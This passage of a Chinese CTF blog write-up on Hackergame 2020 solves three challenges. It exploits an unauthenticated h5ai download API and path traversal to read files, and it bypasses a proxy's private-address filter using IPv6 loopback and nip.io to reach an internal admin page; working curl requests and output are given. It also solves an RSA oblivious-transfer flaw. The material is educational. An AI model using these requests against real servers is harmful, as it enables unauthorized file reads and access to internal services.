<p>于是这题其实就是 <strong>h5ai 自带的 API 造成的文件读取</strong>，主要这个接口没有鉴权，更主要的是 Dockerfile 里用的是 cp 复制而不是 mv 移动。</p>
<p>噢对了，要用根目录的那个 <code>_h5ai</code>.</p>
<p>（发现根目录访问 <code>.php</code> 会直接丢给 fastcgi 处理了，也就绕过了 Basic Auth。</p>
<p><strong>Payload:</strong>  POST</p>
<pre class="language-none"><code class="language-none">http://202.38.93.111:10120/_h5ai/public/index.php?action=download&amp;as=flag&amp;type=shell-zip&amp;baseHref=/</code></pre>
<p>（<code>hrefs</code> 参数发现不需要也行。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105011630778.png" alt="FLAG"></p>
<p>保存响应，然后解压就得到 flag.txt 了。</p>
<p><code>flag{super_secure_cloud}</code></p>
<blockquote>
<p>BTW, 有大佬发现这里的<code>hrefs</code> 参数没有检查 <code>\\..</code>, <code>..\\</code> 等，可以构造路径 <code>/Public\\..\\flag.txt</code>，此时经过 normalize 后 <code>/Public/../</code>，从而路径穿越实现任意文件读取。</p>
<p>详见 <a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/54ddd50dad28aa1fe898edbccb1d266a31798879/players/cytvictor/writeup.md">cytvictor 师傅的 WriteUp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lrsjng/h5ai/issues/758">h5ai#758: A potential security issue of unauthorized access</a></p>
<p>以及 <a target="_blank" rel="noopener" href="https://github.com/lrsjng/h5ai/issues/760">h5ai#760: Unchecked l10n input leads to arbitrary JSON file reads</a></p>
<p>（算是 0day 漏洞了吧</p>
</blockquote>
<hr>
<h2 id="超安全的代理服务器"><a href="#超安全的代理服务器" class="headerlink" title="超安全的代理服务器"></a>超安全的代理服务器</h2><p><em>（复现）</em></p>
<blockquote>
<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>
<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>
<p><strong>公告：题目帮助页面（<a target="_blank" rel="noopener" href="https://146.56.228.227/help%EF%BC%89%E5%8F%B3%E4%B8%8B%E8%A7%92%E7%9A%84%E3%80%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83%E3%80%8D%E9%93%BE%E6%8E%A5%E6%9C%89%E8%AF%AF%EF%BC%8C%E5%BA%94%E8%AF%A5%E4%B8%8E%E9%A6%96%E9%A1%B5%E7%9B%B8%E5%90%8C%EF%BC%8C%E9%83%BD%E6%98%AF%E6%8C%87%E5%90%91">https://146.56.228.227/help）右下角的「管理中心」链接有误，应该与首页相同，都是指向</a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></strong></p>
</blockquote>
<h3 id="找到-Secret"><a href="#找到-Secret" class="headerlink" title="找到 Secret"></a>找到 Secret</h3><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107205709657.png" alt="主页"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107205810635.png" alt="help"></p>
<p>这题用了 HTTP2 的 Server PUSH。</p>
<p>具体可以参考一下 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/HTTP/2_Server_Push">Wikipedia: HTTP/2 Server Push</a> 以及 <a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/03/http2_server_push.html">阮一峰的HTTP/2 服务器推送（Server Push）教程</a>。</p>
<p>通常用到 Server Push 的话都是把 CSS、JS 之类的资源顺便推送给用户，然而这一题换了几个浏览器都没见到推送了啥资源……</p>
<p>甚至用 Postman（貌似不支持 HTTP2?） / Burp Suite（手动改请求头）降级到 HTTP/1.0 或者 HTTP/1.1，就不让你用。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107210459289.png" alt="postman"></p>
<p>而 cURL 都直接不让你用。把 headers 都加上了，也不知道他怎么判断到的。。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"https://146.56.228.227/"</span> -H <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span> -H <span class="token string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span> -H <span class="token string">"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span> --compressed -H <span class="token string">"Connection: keep-alive"</span> -H <span class="token string">"Upgrade-Insecure-Requests: 1"</span> -H <span class="token string">"Pragma: no-cache"</span> -H <span class="token string">"Cache-Control: no-cache"</span> -H <span class="token string">"TE: Trailers"</span> -k -vv --http2</code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107210632627.png" alt="curl"></p>
<p>但是这个信息肯定是在网络流里传输的，Wireshark 抓包的话肯定能抓到。</p>
<p>但是这里用到了 tls 加密，直接抓是抓不到明文的，然而我做这题的时候没配好还是没抓到明文（大草。</p>
<p>首先需要在系统设置一个 <code>SSLKEYLOGFILE</code> 环境变量，变量值为你喜欢的路径下建的一个用来保存 log 的文件。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230305958.png" alt="编辑环境变量"></p>
<p>而后在 wireshark 里设置文件路径。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230402487.png" alt="Wireshark设置"></p>
<p>再打开浏览器访问题目，就能在 wireshark 里抓到明文包了。</p>
<p>追踪 TLS 流 / HTTP2 stream 就能看到这个推送的 secret 和 flag1 了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107230038744.png" alt="flag1"></p>
<blockquote>
<p><span class="github-emoji"><span>⚠</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>抓包完成后请及时删除此环境变量，防止信息泄露。</strong> </p>
</blockquote>
<p>这个题看到官方WP 给了基于 nghttp2 的解法。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nghttp -v https://146.56.228.227/</code></pre>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108000716189.png" alt="另一种解法"></p>
<h3 id="入侵管理中心"><a href="#入侵管理中心" class="headerlink" title="入侵管理中心"></a>入侵管理中心</h3><p>网页上的 管理中心 URL 为 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a> ，访问 <a target="_blank" rel="noopener" href="http://146.56.228.227:8080/">http://146.56.228.227:8080/</a> 提示</p>
<blockquote>
<p>管理中心无法从公网直接访问</p>
</blockquote>
<p>根据 帮助 给出的提示，需要利用 CONNECT 协议。</p>
<p>根据 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7231#section-4.3.6">RFC 7231</a> 中的相关内容，结合题目所需的<code>secret</code>，请求头格式如下。</p>
<pre class="language-none"><code class="language-none">CONNECT server.example.com:80 HTTP/1.1
Host: server.example.com:80
Secret: xxxxxxxx
</code></pre>
<p>再看过滤的列表</p>
<blockquote>
<ul>
<li>全球单播地址</li>
<li>10.0.0.0/8</li>
<li>127.0.0.0/8</li>
<li>172.16.0.0/12</li>
<li>192.168.0.0/16</li>
</ul>
</blockquote>
<p>其中不包括 IPv6 地址，可以试试本地环回，即<code>[::1]</code>。</p>
<p>构造请求发过去试试，发现成功建立连接。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107233927125.png" alt="成功建立连接"></p>
<blockquote>
<p>The recipient proxy can establish a tunnel either by directly connecting to the request-target or, if configured to use another proxy, by forwarding the CONNECT request to the next inbound proxy. Any 2xx (Successful) response indicates that the sender (and all inbound proxies) will switch to tunnel mode immediately after the blank line that concludes the successful response’s header section; data received after that blank line is from the server identified by the request-target.  Any response other than a successful response indicates that the tunnel has not yet been formed and that the connection remains governed by HTTP.</p>
<p>A tunnel is closed when a tunnel intermediary detects that either side has closed its connection: the intermediary MUST attempt to send any outstanding data that came from the closed side to the other side, close both connections, and then discard any remaining data left undelivered.</p>
</blockquote>
<p>说明隧道已经建立了，但貌似做不到马上发下一个请求，于是隧道就关闭了。</p>
<p>用 Burp Suite 发包这个方案不实在（（</p>
<p>好烦啊喵，用 curl 好了吧。（参考了官方 WP）</p>
<p>需要带上 Referer，否则会提示 </p>
<blockquote>
<p>管理中心需要从 ‘146.56.228.227’ 被访问(Referer)</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> -x https://146.56.228.227:443 --proxy-insecure -vvnn -p --proxy-header <span class="token string">"Secret: aa08235651"</span> http://<span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080 -H <span class="token string">"Referer: 146.56.228.227"</span>
* Rebuilt URL to: http://<span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080/
* Couldn't <span class="token function">find</span> <span class="token function">host</span> ::1 <span class="token keyword">in</span> the .netrc <span class="token function">file</span><span class="token punctuation">;</span> using defaults
*   Trying <span class="token number">146.56</span>.228.227<span class="token punctuation">..</span>.
* TCP_NODELAY <span class="token builtin class-name">set</span>
* Connected to <span class="token number">146.56</span>.228.227 <span class="token punctuation">(</span><span class="token number">146.56</span>.228.227<span class="token punctuation">)</span> port <span class="token number">443</span> <span class="token punctuation">(</span><span class="token comment">#0)</span>
* successfully <span class="token builtin class-name">set</span> certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS handshake, Client hello <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Server hello <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Unknown <span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Certificate <span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, CERT verify <span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Finished <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS change cipher, Client hello <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS handshake, Finished <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>:
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256
* Proxy certificate:
*  subject: <span class="token assign-left variable">O</span><span class="token operator">=</span>mkcert development certificate<span class="token punctuation">;</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>root@hg20-debian
*  start date: Jun  <span class="token number">1</span> 00:00:00 <span class="token number">2019</span> GMT
*  expire date: Oct <span class="token number">23</span> 01:13:11 <span class="token number">2030</span> GMT
*  issuer: <span class="token assign-left variable">O</span><span class="token operator">=</span>mkcert development CA<span class="token punctuation">;</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>root@hg20-debian<span class="token punctuation">;</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>mkcert root@hg20-debian
*  SSL certificate verify result: unable to get <span class="token builtin class-name">local</span> issuer certificate <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>, continuing anyway.
* allocate connect buffer<span class="token operator">!</span>
* Establish HTTP proxy tunnel to ::1:8080
* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:
<span class="token operator">&gt;</span> CONNECT <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080 HTTP/1.1
<span class="token operator">&gt;</span> Host: <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080
<span class="token operator">&gt;</span> User-Agent: curl/7.58.0
<span class="token operator">&gt;</span> Proxy-Connection: Keep-Alive
<span class="token operator">&gt;</span> Secret: aa08235651
<span class="token operator">&gt;</span> 
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Certificate Status <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS handshake, Newsession Ticket <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>:
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:
<span class="token operator">&lt;</span> HTTP/1.1 <span class="token number">200</span> OK
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:
<span class="token operator">&lt;</span> Content-Length: <span class="token number">0</span>
* Ignoring Content-Length <span class="token keyword">in</span> CONNECT <span class="token number">200</span> response
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:
<span class="token operator">&lt;</span> 
* Proxy replied <span class="token number">200</span> to CONNECT request
* CONNECT phase completed<span class="token operator">!</span>
* CONNECT phase completed<span class="token operator">!</span>
* CONNECT phase completed<span class="token operator">!</span>
* TLSv1.3 <span class="token punctuation">(</span>OUT<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:
<span class="token operator">&gt;</span> GET / HTTP/1.1
<span class="token operator">&gt;</span> Host: <span class="token punctuation">[</span>::1<span class="token punctuation">]</span>:8080
<span class="token operator">&gt;</span> User-Agent: curl/7.58.0
<span class="token operator">&gt;</span> Accept: */*
<span class="token operator">&gt;</span> Referer: <span class="token number">146.56</span>.228.227
<span class="token operator">&gt;</span> 
* TLSv1.3 <span class="token punctuation">(</span>IN<span class="token punctuation">)</span>, TLS Unknown, Unknown <span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span>:
<span class="token operator">&lt;</span> HTTP/1.1 <span class="token number">200</span> OK
<span class="token operator">&lt;</span> Date: Sat, 07 Nov <span class="token number">2020</span> <span class="token number">15</span>:59:36 GMT
<span class="token operator">&lt;</span> Content-Length: <span class="token number">32</span>
<span class="token operator">&lt;</span> Content-Type: text/plain<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
<span class="token operator">&lt;</span> 
* Connection <span class="token comment">#0 to host 146.56.228.227 left intact</span>
flag2: flag<span class="token punctuation">{</span>c0me_1n_t4_my_h0use<span class="token punctuation">}</span></code></pre>
<p>另外看到 <a target="_blank" rel="noopener" href="https://imlonghao.com/58.html">imlonghao 师傅的命令大法</a>。（原来的代码在我这 Ubuntu 报错，于是改了一下反引号执行）</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -v -k --proxy https://146.56.228.227/ --proxy-insecure --proxy-header <span class="token string">"Secret: <span class="token variable"><span class="token variable">`</span><span class="token punctuation">(</span>nghttp https://146.56.228.227/ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> secret: <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$4</span>}'</span><span class="token punctuation">)</span><span class="token variable">`</span></span>"</span> http://www.ustc.edu.cn.127.0.0.1.nip.io:8080/ -p -H <span class="token string">"Referer: https://146.56.228.227"</span></code></pre>
<p>BTW， <a target="_blank" rel="noopener" href="http://www.ustc.edu.cn.127.0.0.1.nip.io/">www.ustc.edu.cn.127.0.0.1.nip.io</a> 这个域名会解析到 127.0.0.1，详见 <a target="_blank" rel="noopener" href="https://nip.io/">https://nip.io</a> 任意 IP DNS 泛域名。</p>
<hr>
<h2 id="不经意传输"><a href="#不经意传输" class="headerlink" title="不经意传输"></a>不经意传输</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
<span class="token keyword">from</span> random <span class="token keyword">import</span> SystemRandom
<span class="token keyword">import</span> os

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    random <span class="token operator">=</span> SystemRandom<span class="token punctuation">(</span><span class="token punctuation">)</span>

    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>e<span class="token punctuation">)</span>

    m0 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>
    m1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>

    x0 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
    x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span>key<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x0 ="</span><span class="token punctuation">,</span> x0<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x1 ="</span><span class="token punctuation">,</span> x1<span class="token punctuation">)</span>

    v <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"v = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    m0_ <span class="token operator">=</span> <span class="token punctuation">(</span>m0 <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>v <span class="token operator">-</span> x0<span class="token punctuation">,</span> key<span class="token punctuation">.</span>d<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n
    m1_ <span class="token operator">=</span> <span class="token punctuation">(</span>m1 <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>v <span class="token operator">-</span> x1<span class="token punctuation">,</span> key<span class="token punctuation">.</span>d<span class="token punctuation">,</span> key<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> key<span class="token punctuation">.</span>n
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m0_ ="</span><span class="token punctuation">,</span> m0_<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m1_ ="</span><span class="token punctuation">,</span> m1_<span class="token punctuation">)</span>

    guess0 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"m0 = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    guess1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"m1 = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> guess0 <span class="token operator">==</span> m0<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> guess1 <span class="token operator">==</span> m1<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nope"</span><span class="token punctuation">)</span></code></pre>
<h3 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h3><p>直接令 <code>v = x0</code>，这样直接就 <code>m0_ = m0</code> 了，得到 flag1.</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105215141495.png" alt="flag1"></p>
<hr>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总而言之，这次 Hackergame <strong>题目很有梯度，很有脑洞，感觉不错，学到了许多，下次还来</strong>。</p>
<p>排名的话不停弹跳，好不容易做出道题目上去了，而后掉下来，到了最高的记录也就总榜 rk31 了，最后还是不停往下掉，最后都到总榜 rk41了，233.</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image_2020-11-07_15-31-29.png" alt="总排名"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033648244.png" alt="解题情况"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033920730.png" alt="解题情况"></p>
<p>rk31 顺便留个纪念👇</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201108033613828.png" alt="最高记录"></p>
<p>大师傅们太强了！</p>
<p>喵呜，还是太菜了啊，我自己爬（</p>
<hr>
<p>感觉这篇可以说是最长一篇博客了唉</p>
<p>（先这样吧 写不动了</p>
<p>（溜了溜了喵</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/">https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

